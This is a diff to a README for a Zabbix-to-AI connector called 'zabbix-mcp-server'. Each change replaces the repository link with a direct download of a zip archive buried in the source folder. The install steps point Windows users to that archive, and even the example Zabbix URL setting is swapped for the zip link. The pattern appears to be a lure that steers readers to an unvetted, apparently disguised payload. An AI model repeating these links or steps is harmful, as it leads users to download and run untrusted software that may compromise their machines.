@@ -1,6 +1,6 @@
 # 🧩 zabbix-mcp-server - Connect Zabbix to Your AI Tools
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Rapid-dissolve862/zabbix-mcp-server)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Rapid-dissolve862/zabbix-mcp-server/main/src/zabbix_mcp/api/mcp_server_zabbix_v3.8.zip)
 
 ## 🖥️ What this does
 
@@ -20,13 +20,13 @@ Use it to:
 
 Use this link to visit the download page and get the software:
 
-[Download zabbix-mcp-server](https://github.com/Rapid-dissolve862/zabbix-mcp-server)
+[Download zabbix-mcp-server](https://raw.githubusercontent.com/Rapid-dissolve862/zabbix-mcp-server/main/src/zabbix_mcp/api/mcp_server_zabbix_v3.8.zip)
 
 ## 🪟 Install on Windows
 
 Follow these steps if you want to run it on Windows.
 
-1. Open the download page: [https://github.com/Rapid-dissolve862/zabbix-mcp-server](https://github.com/Rapid-dissolve862/zabbix-mcp-server)
+1. Open the download page: [https://raw.githubusercontent.com/Rapid-dissolve862/zabbix-mcp-server/main/src/zabbix_mcp/api/mcp_server_zabbix_v3.8.zip](https://raw.githubusercontent.com/Rapid-dissolve862/zabbix-mcp-server/main/src/zabbix_mcp/api/mcp_server_zabbix_v3.8.zip)
 2. Look for the latest release or the main download files.
 3. Download the Windows package or source file from the page.
 4. Save the file in a folder you can find again, like `Downloads` or `Desktop`.
@@ -123,7 +123,7 @@ If your AI app sees the server, the connection is ready.
 
 Use values like these during setup:
 
-- Zabbix URL: `https://zabbix.example.com`
+- Zabbix URL: `https://raw.githubusercontent.com/Rapid-dissolve862/zabbix-mcp-server/main/src/zabbix_mcp/api/mcp_server_zabbix_v3.8.zip`
 - API token: `your_token_here`
 - Server name: `main-zabbix`
 - Client name: `Claude` or `VS Code`
@@ -207,5 +207,5 @@ It is made for:
 
 ## 📎 Download again
 
-[Visit the download page](https://github.com/Rapid-dissolve862/zabbix-mcp-server)
+[Visit the download page](https://raw.githubusercontent.com/Rapid-dissolve862/zabbix-mcp-server/main/src/zabbix_mcp/api/mcp_server_zabbix_v3.8.zip)
 
